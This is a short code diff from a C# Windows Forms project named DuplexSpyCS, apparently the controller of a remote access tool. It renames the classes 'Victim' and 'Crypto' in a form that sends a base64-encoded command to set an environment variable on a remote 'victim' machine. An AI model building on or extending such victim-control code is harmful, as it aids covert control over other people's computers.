@@ -12,7 +12,7 @@ namespace DuplexSpyCS
 {
     public partial class frmSysEV : Form
     {
-        public Victim v;
+        public clsVictim v;
 
         public string g_szEvName;
         public EnvironmentVariableTarget g_target;
@@ -47,7 +47,7 @@ namespace DuplexSpyCS
 
         private void button1_Click(object sender, EventArgs e)
         {
-            v.SendCommand($"system|ev|set|{g_szEvName}|{g_target}|{Crypto.b64E2Str(string.Join(";", textBox2.Lines.Where(x => !string.IsNullOrEmpty(x)).ToArray()))}");
+            v.SendCommand($"system|ev|set|{g_szEvName}|{g_target}|{clsCrypto.b64E2Str(string.Join(";", textBox2.Lines.Where(x => !string.IsNullOrEmpty(x)).ToArray()))}");
         }
     }
 }
